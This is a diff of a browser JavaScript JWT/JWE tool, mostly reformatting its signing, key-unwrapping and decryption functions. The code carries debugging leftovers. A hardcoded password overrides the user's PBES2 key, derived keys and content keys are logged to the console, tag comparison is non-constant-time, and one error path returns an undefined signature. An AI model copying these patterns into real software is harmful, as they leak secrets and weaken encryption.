@@ -922,35 +919,35 @@ async function verifySignature(){
  * @param {string} [key=undefined] - The private key (RSA) used for signing (pkcs8 or JWK). If not provided, it will be generated.
  * @return {Promise<string|null>} - The signature as Base64URL string, or null if signing fails.
  */
-async function signRS(header,body,alg, key = undefined) {
+async function signRS(header, body, alg, key = undefined) {
     // const _alg_converter = {"RS256":"SHA-256","RS384":"SHA-384","RS512":"SHA-512"};
     if (!(isBase64Url(header) || isBase64Url(body))) {
         console.error("signRS: invalid header or body");
         return null;
     }
-    if (key && typeof key !== "string"){
+    if (key && typeof key !== "string") {
         console.error("signRS: key is not a string");
         return null;
     }
     const encoder = new TextEncoder();
     // Check if the key is provided via function parameter
-    if (!key){
+    if (!key) {
         // Check if the key is provided via input field if not generate a new keypair
-        if (!(document.getElementById("privateKey").value)){
+        if (!(document.getElementById("privateKey").value)) {
             const keypair = await generateRSAKey();
             document.getElementById('privateKey').value = keypair[0];
             document.getElementById('publicKey').value = keypair[1];
-            key = keypair[0];    
+            key = keypair[0];
         }
         else {
             key = document.getElementById("privateKey").value;
         }
     }
 
-    try{ // import key
+    try { // import key
         const privateKey = await crypto.subtle.importKey(
             key.match(/^-----BEGIN [A-Z ]+-----/) ? "pkcs8" : "jwk",
-            decodeKey(key,isPublicKey=false),
+            decodeKey(key, isPublicKey = false),
             { name: "RSASSA-PKCS1-v1_5", hash: _alg_converter[alg] },
             true,
             ["sign"]
@@ -958,9 +955,9 @@ async function signRS(header,body,alg, key = undefined) {
         // sign the token (this time in one line)
         var signature = await crypto.subtle.sign("RSASSA-PKCS1-v1_5", privateKey, encoder.encode(header + "." + body));
         return b64URLencode(String.fromCharCode(...new Uint8Array(signature)));
-    
+
     }
-    catch(e){
+    catch (e) {
         jwt_error_message("Private Key: " + e);
     }
     return null;
@@ -981,7 +978,7 @@ async function signES(header, body, alg, key = undefined) {
         console.error("signES: invalid header or body");
         return null;
     }
-    if (key && typeof key !== "string"){
+    if (key && typeof key !== "string") {
         console.error("signES: key is not a string");
         return null;
     }
@@ -989,7 +986,7 @@ async function signES(header, body, alg, key = undefined) {
     const curve = _alg_converter[alg][1];
     console.log(_alg_converter[alg][1]);
     // check if key is provided via function parameter
-    if (!key){
+    if (!key) {
         // check if key is provided via input field if not generate a new keypair
         if (!(document.getElementById("privateKey").value)) {
             const keypair = await generateECKey(curve);
@@ -1001,12 +998,12 @@ async function signES(header, body, alg, key = undefined) {
             key = document.getElementById("privateKey").value;
         }
     }
-    
-    try{ // import key
+
+    try { // import key
         // if key is PEM format, import as pkcs8, else import as JWK
         const privateKey = await crypto.subtle.importKey(
             key.match(/^-----BEGIN [A-Z ]+-----/) ? "pkcs8" : "jwk",
-            decodeKey(key,isPublicKey=false),
+            decodeKey(key, isPublicKey = false),
             { name: "ECDSA", namedCurve: _alg_converter[alg][1], },
             true,
             ["sign"]
@@ -1015,14 +1012,14 @@ async function signES(header, body, alg, key = undefined) {
         var signature = await crypto.subtle.sign(
             {
                 name: "ECDSA",
-                hash: {name: _alg_converter[alg][0]}
+                hash: { name: _alg_converter[alg][0] }
             },
             privateKey,
             encoder.encode(header + "." + body)
         );
         return b64URLencode(String.fromCharCode(...new Uint8Array(signature)));
     }
-    catch(e){
+    catch (e) {
         jwt_error_message("Private Key: " + e);
     }
     return null;
@@ -1037,24 +1034,24 @@ async function signES(header, body, alg, key = undefined) {
  * @param {string} [key=undefined] private key (RSA-PSS) used for signing (pkcs8 or JWK). If not provided, it will be generated.
  * @return {Promise<string|null>} The signature as Base64URL string, or null if signing fails.
  */
-async function signPS(header,body,alg,key = undefined) {
+async function signPS(header, body, alg, key = undefined) {
     // const _alg_converter = {"PS256":"SHA-256","PS384":"SHA-384","PS512":"SHA-512"};
     if (!(isBase64Url(header) || isBase64Url(body))) {
         console.error("signPS: invalid header or body");
         return null;
     }
-    if (key && typeof key !== "string"){
+    if (key && typeof key !== "string") {
         console.error("signPS: key is not a string");
         return null;
     }
     // Check if the key is provided via function parameter
-    if (!key){
+    if (!key) {
         // Check if the key is provided via input field if not generate a new keypair
-        if (!(document.getElementById("privateKey").value)){
+        if (!(document.getElementById("privateKey").value)) {
             const keypair = await generatePSKey();
             document.getElementById('privateKey').value = keypair[0];
             document.getElementById('publicKey').value = keypair[1];
-            key = keypair[0];    
+            key = keypair[0];
         }
         else {
             key = document.getElementById("privateKey").value;
@@ -1062,11 +1059,11 @@ async function signPS(header,body,alg,key = undefined) {
     }
 
     const encoder = new TextEncoder();
-    try{ // import key
+    try { // import key
         // if key is PEM format, import as pkcs8, else import as JWK
         const privateKey = await crypto.subtle.importKey(
             key.match(/^-----BEGIN [A-Z ]+-----/) ? "pkcs8" : "jwk",
-            decodeKey(key,isPublicKey=false),
+            decodeKey(key, isPublicKey = false),
             { name: "RSA-PSS", hash: _alg_converter[alg] },
             true,
             ["sign"]
@@ -1075,14 +1072,14 @@ async function signPS(header,body,alg,key = undefined) {
         var signature = await crypto.subtle.sign(
             {
                 name: "RSA-PSS",
-                saltLength: _alg_converter[alg].split("-")[1]/8 //PS256 -> 32 bit, 384 -> 48, 512 -> 64
-            }, 
-            privateKey, 
+                saltLength: _alg_converter[alg].split("-")[1] / 8 //PS256 -> 32 bit, 384 -> 48, 512 -> 64
+            },
+            privateKey,
             encoder.encode(header + "." + body));
         return b64URLencode(String.fromCharCode(...new Uint8Array(signature)));
-    
+
     }
-    catch(e){
+    catch (e) {
         jwt_error_message("Private Key: " + e);
     }
     return null;
@@ -1098,41 +1095,41 @@ async function signPS(header,body,alg,key = undefined) {
  * @param {boolean} [keyIsBase64=false] Indicates if the key is Base64 encoded. Default is false.
  * @return {Promise<string|null>} Base64 URL encoded signature or null if an error occurs
  */
-async function signHS(header,body, alg, key = undefined,keyIsBase64 = false) {
+async function signHS(header, body, alg, key = undefined, keyIsBase64 = false) {
     if (!(isBase64Url(header) || isBase64Url(body))) {
         console.error("signHS: invalid header or body");
         return null;
     }
-    if (key && typeof key !== "string"){
+    if (key && typeof key !== "string") {
         console.error("signHS: key is not a string");
         return null;
     }
-    if (alg !== "HS256" && alg != "HS384" && alg != "HS512"){
-        console.error("signHS: invalid alg",alg);
+    if (alg !== "HS256" && alg != "HS384" && alg != "HS512") {
+        console.error("signHS: invalid alg", alg);
         return null;
     }
     const enc = new TextEncoder();
-    if (!key){ // generate a new key if not provided
+    if (!key) { // generate a new key if not provided
         if (!(document.getElementById("key").value)) {
             key = generateHMACKey(32);
             document.getElementById("key").value = key;
         }
-        else{
+        else {
             key = document.getElementById("key").value;
         }
     }
-    try{ // import the key and sign the token
+    try { // import the key and sign the token
         const hmac_key = await crypto.subtle.importKey(
             "raw",
-            keyIsBase64 ?  base64urlToUint8Array(base64_to_URL(key)) : enc.encode(key),
+            keyIsBase64 ? base64urlToUint8Array(base64_to_URL(key)) : enc.encode(key),
             { name: "HMAC", hash: _alg_converter[alg] },
             false,
             ["sign"]
         );
-    
-        var signature = await crypto.subtle.sign("HMAC", hmac_key, enc.encode(header + "." + body));    
+
+        var signature = await crypto.subtle.sign("HMAC", hmac_key, enc.encode(header + "." + body));
     }
-    catch(e){
+    catch (e) {
         jwt_error_message("Key: " + e);
     }
     return b64URLencode(String.fromCharCode(...new Uint8Array(signature)));
@@ -1152,17 +1149,17 @@ async function signHS(header,body, alg, key = undefined,keyIsBase64 = false) {
  * @return {Promise<Uint8Array>} - The decrypted CEK as a Uint8Array.
  * @throws {Error} - Throws an error if the algorithm is not supported or if the decryption fails.
  */
-async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
+async function decrypt_cek(encrypted_cek, key, alg, encryption_alg, header) {
     console.debug('decrypt cek')
     console.debug(URL_to_base64(encrypted_cek))
     const enc = new TextEncoder()
 
-    if (alg==="RSA-OAEP-256"){
+    if (alg === "RSA-OAEP-256") {
         // Import key
-        try{
+        try {
             var privateKey = await crypto.subtle.importKey(
                 key.match(/^-----BEGIN [A-Z ]+-----/) ? "pkcs8" : "jwk",
-                decodeKey(key,isPublicKey=false),
+                decodeKey(key, isPublicKey = false),
                 {
                     name: "RSA-OAEP",
                     hash: "SHA-256",
@@ -1171,7 +1168,7 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 ['decrypt']
             );
         } catch (error) {
-            console.error("Key Import Failed:",error)
+            console.error("Key Import Failed:", error)
         }
         // Decrypt CEK
         try {
@@ -1184,16 +1181,16 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 base64urlToUint8Array(encrypted_cek)
             )
         } catch (error) {
-            console.error("Decryption Failed:",error)
+            console.error("Decryption Failed:", error)
         }
-            return new Uint8Array(cek)
+        return new Uint8Array(cek)
     }
-    else if (alg==="RSA-OAEP"){
+    else if (alg === "RSA-OAEP") {
         // Import key
-        try{
+        try {
             var privateKey = await crypto.subtle.importKey(
                 key.match(/^-----BEGIN [A-Z ]+-----/) ? "pkcs8" : "jwk",
-                decodeKey(key,isPublicKey=false),
+                decodeKey(key, isPublicKey = false),
                 {
                     name: "RSA-OAEP",
                     hash: "SHA-1",
@@ -1202,10 +1199,10 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 ['decrypt']
             );
         } catch (error) {
-            console.error("Key Import failed:",error)
+            console.error("Key Import failed:", error)
         }
         // decrypt CEK
-        try{
+        try {
             var cek = await crypto.subtle.decrypt(
                 {
                     name: "RSA-OAEP",
@@ -1215,14 +1212,14 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 base64urlToUint8Array(encrypted_cek)
             )
         } catch (error) {
-            console.error("Decryption Failed:",error)
+            console.error("Decryption Failed:", error)
         }
         return new Uint8Array(cek)
     }
-    else if (alg === "A128KW" || alg === "A192KW" || alg === "A256KW"){
-        console.debug("alg: ",_alg_converter[encryption_alg])
-        console.debug("length", encryption_alg.slice(1,4))
-        console.debug("enc_cek_buffer:",base64urlToUint8Array(encrypted_cek))
+    else if (alg === "A128KW" || alg === "A192KW" || alg === "A256KW") {
+        console.debug("alg: ", _alg_converter[encryption_alg])
+        console.debug("length", encryption_alg.slice(1, 4))
+        console.debug("enc_cek_buffer:", base64urlToUint8Array(encrypted_cek))
         // import key
         var kek = await crypto.subtle.importKey(
             "raw",
@@ -1233,9 +1230,9 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
             true,
             ["unwrapKey"]
         )
-        if (["A128CBC-HS256","A192CBC-HS384","A256CBC-HS512"].includes(encryption_alg)){
-            // kinda cheesy but since jwe concatenates cek and hmac_key 
-            // it cant be unwrapped as single key but only as hmac key since those can be of arbitrary length 
+        if (["A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512"].includes(encryption_alg)) {
+            // kinda cheesy but since jwe concatenates cek and hmac_key
+            // it cant be unwrapped as single key but only as hmac key since those can be of arbitrary length
             var cek = await crypto.subtle.unwrapKey(
                 "raw",
                 base64urlToUint8Array(encrypted_cek),
@@ -1248,7 +1245,7 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 ["verify"]
             )
         }
-        else{ // GCM 128, 192, 256
+        else { // GCM 128, 192, 256
             var cek = await crypto.subtle.unwrapKey(
                 "raw",
                 base64urlToUint8Array(encrypted_cek),
@@ -1258,16 +1255,16 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 },
                 {
                     name: _alg_converter[encryption_alg],
-                    length: encryption_alg.slice(1,4)
+                    length: encryption_alg.slice(1, 4)
                 },
                 true,
                 ["decrypt"]
             )
         }
-        console.debug("cek Buffer",new Uint8Array(await crypto.subtle.exportKey("raw", cek)))
+        console.debug("cek Buffer", new Uint8Array(await crypto.subtle.exportKey("raw", cek)))
         return new Uint8Array(await crypto.subtle.exportKey("raw", cek))
     }
-    else if (alg === "A128GCMKW" || alg === "A192GCMKW" || alg === "A256GCMKW"){
+    else if (alg === "A128GCMKW" || alg === "A192GCMKW" || alg === "A256GCMKW") {
         var kek = await crypto.subtle.importKey(
             "raw",
             base64ToUint8Array(key),
@@ -1275,27 +1272,27 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 name: "AES-GCM"
             },
             true,
-            ["unwrapKey","decrypt"]
+            ["unwrapKey", "decrypt"]
         )
-        if (["A128CBC-HS256","A192CBC-HS384","A256CBC-HS512"].includes(encryption_alg)){
-            // kinda cheesy but since jwe concatenates cek and hmac_key 
-            // it cant be unwrapped as single key but only as hmac key since those can be of arbitrary length 
-            // even more cheese this time 
+        if (["A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512"].includes(encryption_alg)) {
+            // kinda cheesy but since jwe concatenates cek and hmac_key
+            // it cant be unwrapped as single key but only as hmac key since those can be of arbitrary length
+            // even more cheese this time
             var cek = crypto.subtle.decrypt(
                 {
-                  name: "AES-GCM",
-                  iv: base64urlToUint8Array(header.iv),
-                  tagLength: 128
+                    name: "AES-GCM",
+                    iv: base64urlToUint8Array(header.iv),
+                    tagLength: 128
                 },
                 kek,
                 new Uint8Array([
-                  ...base64urlToUint8Array(encrypted_cek),
-                  ...base64urlToUint8Array(header.tag)
+                    ...base64urlToUint8Array(encrypted_cek),
+                    ...base64urlToUint8Array(header.tag)
                 ])
-              );
+            );
             return cek;
         }
-        else{ // GCM 128, 192, 256
+        else { // GCM 128, 192, 256
             var cek = await crypto.subtle.unwrapKey(
                 "raw",
                 new Uint8Array([...base64urlToUint8Array(encrypted_cek), ...base64urlToUint8Array(header.tag)]),
@@ -1307,7 +1304,7 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 },
                 {
                     name: _alg_converter[encryption_alg],
-                    length: encryption_alg.slice(1,4)
+                    length: encryption_alg.slice(1, 4)
                 },
                 true,
                 ["decrypt"]
@@ -1320,7 +1317,7 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
         key = btoa("Possibly-Instructive-Puzzle")
         const passwordBuffer = await crypto.subtle.importKey(
             "raw",
-            base64ToUint8Array(key), 
+            base64ToUint8Array(key),
             { name: "PBKDF2" },
             false,
             ["deriveKey"]
@@ -1332,7 +1329,7 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
         console.debug("===================");
         console.debug("salt raw:", header.p2s)
         console.debug("salt decoded:", base64urlToUint8Array(header.p2s))
-        console.debug("iterations:",header.p2c)
+        console.debug("iterations:", header.p2c)
         console.debug("hash:", _alg_converter[alg])
         console.debug("length:", encryption_alg.slice(1, 4))
         const kek = await crypto.subtle.deriveKey(
@@ -1359,7 +1356,7 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
         console.debug("derived kek:b64url", Uint8ArrayTobase64Url(await crypto.subtle.exportKey("raw", kek)))
         console.debug("encrypted_cek:", encrypted_cek);
         console.debug("encrypted_cek bytes:", base64urlToUint8Array(encrypted_cek))
-        
+
         // DEBUGGING: Teste mit bekanntem funktionierenden KEK
         console.debug("=== KEK TEST ===");
         try {
@@ -1371,11 +1368,11 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 true,
                 ["unwrapKey"]
             );
-            
+
             console.debug("Test KEK erstellt:", testKek);
             console.debug("Test KEK algorithm:", testKek.algorithm);
             console.debug("Test KEK usages:", testKek.usages);
-            
+
             // Teste unwrapKey mit dem re-importierten KEK
             const testCek = await crypto.subtle.unwrapKey(
                 "raw",
@@ -1386,10 +1383,10 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 true,
                 ["verify"]
             );
-            
+
             console.debug("✅ Test unwrapKey ERFOLGREICH!", testCek);
             console.debug("Test CEK bytes:", new Uint8Array(await crypto.subtle.exportKey("raw", testCek)));
-            
+
         } catch (testError) {
             console.debug("❌ Test unwrapKey FEHLGESCHLAGEN:", testError);
         }
@@ -1403,11 +1400,11 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 base64ToUint8Array(key), // Dein aktueller Ansatz
                 new TextEncoder().encode(atob(key)) // Base64 dekodiert zu UTF-8
             ];
-            
+
             for (let i = 0; i < testPasswords.length; i++) {
                 console.debug(`--- Test Passwort ${i + 1} ---`);
                 console.debug("Password bytes:", testPasswords[i]);
-                
+
                 try {
                     const testPasswordBuffer = await crypto.subtle.importKey(
                         "raw",
@@ -1416,7 +1413,7 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                         false,
                         ["deriveKey"]
                     );
-                    
+
                     const testKek = await crypto.subtle.deriveKey(
                         {
                             name: "PBKDF2",
@@ -1432,17 +1429,17 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                         true,
                         ["unwrapKey"]
                     );
-                    
+
                     const testKekBytes = await crypto.subtle.exportKey("raw", testKek);
                     console.debug(`Test KEK ${i + 1} bytes:`, new Uint8Array(testKekBytes));
-                    
+
                     // Vergleiche mit deinem originalen KEK
                     const originalKekBytes = await crypto.subtle.exportKey("raw", kek);
-                    const areEqual = new Uint8Array(testKekBytes).every((val, idx) => 
+                    const areEqual = new Uint8Array(testKekBytes).every((val, idx) =>
                         val === new Uint8Array(originalKekBytes)[idx]
                     );
                     console.debug(`KEK ${i + 1} gleich original:`, areEqual);
-                    
+
                 } catch (testErr) {
                     console.debug(`Test Passwort ${i + 1} FEHLER:`, testErr);
                 }
@@ -1467,19 +1464,19 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                     true,
                     ["verify"]
                 );
-                
+
                 console.debug(`✅ ${testHash} ERFOLGREICH!`, testCek);
                 console.debug(`${testHash} CEK:`, new Uint8Array(await crypto.subtle.exportKey("raw", testCek)));
                 break; // Wenn erfolgreich, breche ab
-                
+
             } catch (hashError) {
                 console.debug(`❌ ${testHash} FEHLGESCHLAGEN:`, hashError);
             }
         }
         console.debug("=== ENDE HMAC HASH TEST ===");
-        if (["A128CBC-HS256","A192CBC-HS384","A256CBC-HS512"].includes(encryption_alg)){
-            // kinda cheesy but since jwe concatenates cek and hmac_key 
-            // it cant be unwrapped as single key but only as hmac key since those can be of arbitrary length 
+        if (["A128CBC-HS256", "A192CBC-HS384", "A256CBC-HS512"].includes(encryption_alg)) {
+            // kinda cheesy but since jwe concatenates cek and hmac_key
+            // it cant be unwrapped as single key but only as hmac key since those can be of arbitrary length
             // ORIGINAL unwrapKey mit erweiterten Debug-Infos
             console.debug("=== FINALER UNWRAP TEST ===");
             console.debug("Verwende:");
@@ -1497,20 +1494,20 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                     true,
                     ["verify"]
                 );
-                
+
                 console.debug("✅ FINALER UNWRAP ERFOLGREICH!");
                 console.debug("Final CEK:", new Uint8Array(await crypto.subtle.exportKey("raw", cek)));
-                
+
             } catch (finalError) {
                 console.debug("❌ FINALER UNWRAP FEHLGESCHLAGEN:", finalError);
                 console.debug("Error name:", finalError.name);
                 console.debug("Error message:", finalError.message);
             }
             console.debug("=== ENDE FINALER UNWRAP TEST ===");
-            console.debug("enc_cek: b64url",encrypted_cek)
-            console.debug("kek:",kek)
-            console.debug("alg:",_alg_converter[encryption_alg])
-            console.debug("hash:",_alg_converter[encryption_alg.split('-')[1]])
+            console.debug("enc_cek: b64url", encrypted_cek)
+            console.debug("kek:", kek)
+            console.debug("alg:", _alg_converter[encryption_alg])
+            console.debug("hash:", _alg_converter[encryption_alg.split('-')[1]])
             var cek = await crypto.subtle.unwrapKey(
                 "raw",
                 base64urlToUint8Array(encrypted_cek),
@@ -1518,13 +1515,13 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 {
                     name: "AES-KW"
                 },
-                { name: "HMAC", hash: _alg_converter[encryption_alg.split('-')[1]]},
+                { name: "HMAC", hash: _alg_converter[encryption_alg.split('-')[1]] },
                 true,
                 ["verify"]
             )
-            
+
         }
-        else{ // GCM 128, 192, 256
+        else { // GCM 128, 192, 256
             var cek = await crypto.subtle.unwrapKey(
                 "raw",
                 base64urlToUint8Array(encrypted_cek),
@@ -1534,12 +1531,12 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 },
                 {
                     name: _alg_converter[encryption_alg],
-                    length: encryption_alg.slice(1,4)
+                    length: encryption_alg.slice(1, 4)
                 },
                 true,
                 ["decrypt"]
             )
-        }   
+        }
         return new Uint8Array(await crypto.subtle.exportKey("raw", cek))
     }
     else if (alg === "ECDH-ES") {
@@ -1555,13 +1552,13 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
             "A192GCM": "SHA-384",
             "A256GCM": "SHA-512",
         };
-        
+
         console.debug("alg:", _alg_converter[encryption_alg]);
-        
+
         // Verwende ein leeres Array als Standardwert für salt, wenn es nicht im Header vorhanden ist
         const salt = header.salt ? base64urlToUint8Array(header.salt) : new Uint8Array(0);
         console.log("salt:", salt);
-        
+
         // Importiere den ephemeral public key
         const ephemeralPublicKey = await crypto.subtle.importKey(
             "jwk",
@@ -1573,7 +1570,7 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
             false,  // extractable: false
             []
         );
-        
+
         // Importiere den privaten Schlüssel
         const privateKey = await crypto.subtle.importKey(
             key.match(/^-----BEGIN [A-Z ]+-----/) ? "pkcs8" : "jwk",
@@ -1585,7 +1582,7 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
             false,  // extractable: false
             ["deriveKey"]
         );
-        
+
         // Berechne die richtige Schlüssellänge für den Algorithmus
         let keyLength;
         if (encryption_alg.includes("CBC-HS")) {
@@ -1594,10 +1591,10 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
         } else {
             keyLength = parseInt(encryption_alg.match(/(\d{3})/)[0]);
         }
-        
+
         // Bestimme den Namen des Algorithmus für die Web Crypto API
         const alg_name = encryption_alg.includes("GCM") ? "AES-GCM" : "AES-CBC";
-        
+
         try {
             // Leite den Schlüssel zweistufig ab
             // Schritt 1: Gemeinsames Geheimnis aus ECDH ableiten
@@ -1616,7 +1613,7 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 false,
                 ["deriveKey"]
             );
-            
+
             // Schritt 2: Verwende HKDF, um den finalen CEK abzuleiten
             const cek = await crypto.subtle.deriveKey(
                 {
@@ -1633,7 +1630,7 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
                 true,  // Extrahierbar machen, um den Rohschlüssel zu erhalten
                 ["decrypt"]
             );
-            
+
             return new Uint8Array(await crypto.subtle.exportKey("raw", cek));
         } catch (error) {
             console.error("Fehler bei der Schlüsselableitung:", error);
@@ -1641,13 +1638,13 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
         }
         */
     }
-    else if (alg === "dir"){ // direct encryption
+    else if (alg === "dir") { // direct encryption
         return base64ToUint8Array(key); // key is the CEK
     }
-        else{
-        throw new Error(alg+"Algorithm not supported")
+    else {
+        throw new Error(alg + "Algorithm not supported")
     }
-    
+
 }
 
 /**
@@ -1655,9 +1652,9 @@ async function decrypt_cek(encrypted_cek, key, alg, encryption_alg,header){
  * It takes the JWE from "tokenJWE" input field, decrypts it using the provided key and algorithm
  *
  * @return {Promise<boolean>} - Returns true if the decryption was successful, false otherwise.
- * @description This function is called when the user clicks the "Decrypt" button in the UI. 
+ * @description This function is called when the user clicks the "Decrypt" button in the UI.
  */
-async function decrypt(){
+async function decrypt() {
     // <protected_header>.<encrypted_key>.<iv>.<ciphertext>.<authentication_tag>
     /** Read protected Header
      *  decrypt encrypted_key (cek)
@@ -1668,7 +1665,7 @@ async function decrypt(){
     document.getElementById("jweErrorMessage").innerText = "";
 
     const encrypted_token = document.getElementById("tokenJWE").value;
-    if (!(isValidJWE(encrypted_token))){
+    if (!(isValidJWE(encrypted_token))) {
         document.getElementById("errorMessageEncodedJWE").value = "Bad Token";
         return false;
     }
@@ -1683,52 +1680,51 @@ async function decrypt(){
     // Set UI elements
     document.getElementById("algorithmJWE").value = protected_header.alg;
     document.getElementById("encryptionAlgorithmJWE").value = protected_header.enc;
-    document.getElementById("decodedHeaderJWE").value = JSON.stringify(protected_header,undefined,4)
-    
-    
+    document.getElementById("decodedHeaderJWE").value = JSON.stringify(protected_header, undefined, 4)
+
     // Read Key
     let key = document.getElementById("keyJWE").value
     key = document.getElementById("isSymmetricKeyJWEBase64").checked ? key : btoa(key);
     // Symmetric Key (dir, Axxx)
-    if (protected_header.alg[0]==="A" || protected_header.alg === "dir"){ //TODO ist "dir" hier richtig?
+    if (protected_header.alg[0] === "A" || protected_header.alg === "dir") { //TODO ist "dir" hier richtig?
         document.getElementById("symKeysJWE").style.display = "block";
         document.getElementById("asymKeysJWE").style.display = "none";
         document.getElementById("pbkdf2-parametersJWE").style.display = "none";
-        
+
     }
-    else if (protected_header.alg === "PBES2-HS256+A128KW" || protected_header.alg === "PBES2-HS384+A192KW" || protected_header.alg === "PBES2-HS512+A256KW"){
+    else if (protected_header.alg === "PBES2-HS256+A128KW" || protected_header.alg === "PBES2-HS384+A192KW" || protected_header.alg === "PBES2-HS512+A256KW") {
         document.getElementById("symKeysJWE").style.display = "block";
         document.getElementById("asymKeysJWE").style.display = "none";
         document.getElementById("pbkdf2-parametersJWE").style.display = "block";
         document.getElementById("saltJWE").value = URL_to_base64(protected_header.p2s)
         document.getElementById("pbkdf2IterationsJWE").value = protected_header.p2c
-        
+
     }
     // Asymmetric Key (RSA, ECDH-ES)
-    else{
+    else {
         document.getElementById("symKeysJWE").style.display = "none";
         document.getElementById("asymKeysJWE").style.display = "block";
         document.getElementById("pbkdf2-parametersJWE").style.display = "none";
-        key = document.getElementById("privateKeyJWE").value  
+        key = document.getElementById("privateKeyJWE").value
     }
-    if (!key){
+    if (!key) {
         jwe_error_message("Key is required for decryption")
         return false;
     }
     // Decrypt encrypted_cek
-    
-    const cek = await decrypt_cek(encrypted_cek, key,protected_header.alg,protected_header.enc,protected_header);
-    console.debug("decrypted cek:",cek)
+
+    const cek = await decrypt_cek(encrypted_cek, key, protected_header.alg, protected_header.enc, protected_header);
+    console.debug("decrypted cek:", cek)
     //document.getElementById("cek").value = URL_to_base64(Uint8ArrayTobase64Url(cek));
-    
+
     // decrypt ciphertext
-    const body = await decrypt_ciphertext(ciphertext, cek, iv, protected_header.enc, split_token[0],authentication_tag)
-    try { // TODO Better way of dealing with invalid JSON 
-        document.getElementById("decodedBodyJWE").value = JSON.stringify(JSON.parse(body),undefined,4);
+    const body = await decrypt_ciphertext(ciphertext, cek, iv, protected_header.enc, split_token[0], authentication_tag)
+    try { // TODO Better way of dealing with invalid JSON
+        document.getElementById("decodedBodyJWE").value = JSON.stringify(JSON.parse(body), undefined, 4);
     } catch (error) {
         document.getElementById("decodedBodyJWE").value = body;
     }
-    console.info("Decryption successful:",body)
+    console.info("Decryption successful:", body)
     return true
 }
 
@@ -1737,36 +1733,36 @@ async function decrypt(){
  * This is used in the context of AES encryption.
  *
  * @param {Uint8Array} aad - Uint8Array: Ascii Additional Authenticated Data (AAD)
- * @return {Uint8Array} - 8 Byte Array: Length of AAD in Bits 
+ * @return {Uint8Array} - 8 Byte Array: Length of AAD in Bits
  */
 function getAL(aad) {
-    const aadLengthInBits = aad.length * 8; 
-    
-    const alBuffer = new ArrayBuffer(8); 
+    const aadLengthInBits = aad.length * 8;
+
+    const alBuffer = new ArrayBuffer(8);
     const alView = new DataView(alBuffer);
-    
+
     // set as big endian
     alView.setUint32(4, aadLengthInBits);  // lower 32 Bit
-    alView.setUint32(0, Math.floor(aadLengthInBits / 2**32));  // upper 32 Bit
+    alView.setUint32(0, Math.floor(aadLengthInBits / 2 ** 32));  // upper 32 Bit
 
     return new Uint8Array(alBuffer);
 }
 /**
- * Verifies the ciphertext using HMAC authentication tag. 
+ * Verifies the ciphertext using HMAC authentication tag.
  *
  * @param {string} additionalData - Ascii: contains the protected header
  * @param {string} iv - Base64Url
  * @param {string} ciphertext - Base64Url
- * @param {Uint8Array} hmac_key 
+ * @param {Uint8Array} hmac_key
  * @param {string} auth_tag - Base64Url
  * @param {string} alg - Algorithm used for HMAC (A128CBC-HS256, A192CBC-HS384, A256CBC-HS512)
  * @returns {Promise<boolean>} - true if the verification is successful, false otherwise
  */
-async function verify_jwe_cbc(additionalData, iv, ciphertext, hmac_key,alg,auth_tag){    
+async function verify_jwe_cbc(additionalData, iv, ciphertext, hmac_key, alg, auth_tag) {
     // AAD || IV || Ciphertext || AL
     const enc = new TextEncoder()
-    try{  // import key 
-        console.debug("hash_alg",_alg_converter[alg.split('-')[1]])
+    try {  // import key
+        console.debug("hash_alg", _alg_converter[alg.split('-')[1]])
         var key = await crypto.subtle.importKey(
             "raw",
             hmac_key,
@@ -1778,11 +1774,11 @@ async function verify_jwe_cbc(additionalData, iv, ciphertext, hmac_key,alg,auth_
             ["sign"]
         )
     }
-    catch (error){
+    catch (error) {
         console.error(`Key import for hmac ${alg} failed: ${error}`)
         return false
     }
-    try{ // sign the data and manually verify the tag
+    try { // sign the data and manually verify the tag
         // HMAC = HMAC(AAD || IV || Ciphertext || AL)
         var signature = await crypto.subtle.sign(
             'HMAC',
@@ -1790,17 +1786,18 @@ async function verify_jwe_cbc(additionalData, iv, ciphertext, hmac_key,alg,auth_
             new Uint8Array([...enc.encode(additionalData), ...base64urlToUint8Array(iv), ...base64urlToUint8Array(ciphertext), ...getAL(enc.encode(additionalData))])
         )
     }
-    catch (error){
+    catch (error) {
         console.error(`Signature failed: CBC Auth Tag Verification:  ${error}`)
         return false
     }
     // verify the tag
     const areEqual = (a, b) =>
-        a.length === b.length && a.every((val, i) => val === b[i]);    
-    if (areEqual(new Uint8Array(signature.slice(0,hmac_key.length)),base64urlToUint8Array(auth_tag))){ 
+        a.length === b.length && a.every((val, i) => val === b[i]);
